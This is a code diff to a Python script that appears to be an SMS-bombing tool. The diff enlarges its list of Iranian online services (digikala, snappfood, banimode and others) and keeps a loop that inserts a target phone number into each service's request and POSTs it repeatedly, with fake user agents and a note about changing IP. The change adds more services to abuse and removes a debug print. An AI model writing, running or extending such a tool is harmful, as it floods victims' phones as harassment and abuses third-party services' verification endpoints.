@@ -7,7 +7,7 @@ import re
 from fake_useragent import UserAgent
 
 range_n_limit = 100
-services = ['rirabook', 'doctoreto', 'SMS.ir', 'vipshop', 'digikala', 'okala', 'basalam', 'banimode']
+services = ['rirabook', 'kellowear', 'snappfood', 'snapp', 'SMS.ir', 'vipshop', 'digikala', 'bamiloshop', 'banimode', 'doctoreto']
 
 
 def validate_phone_number(phone_number):
@@ -42,7 +42,7 @@ def send(phone_number, range_n):  # add prvity Change IP
                     req_data = json.dumps(req_data)
 
                 req_data = req_data.replace('numnum', phone_number)
-                print(req_data)
+
                 req = requests.post(url=url, data=req_data, headers=headers)
 
                 print(req)
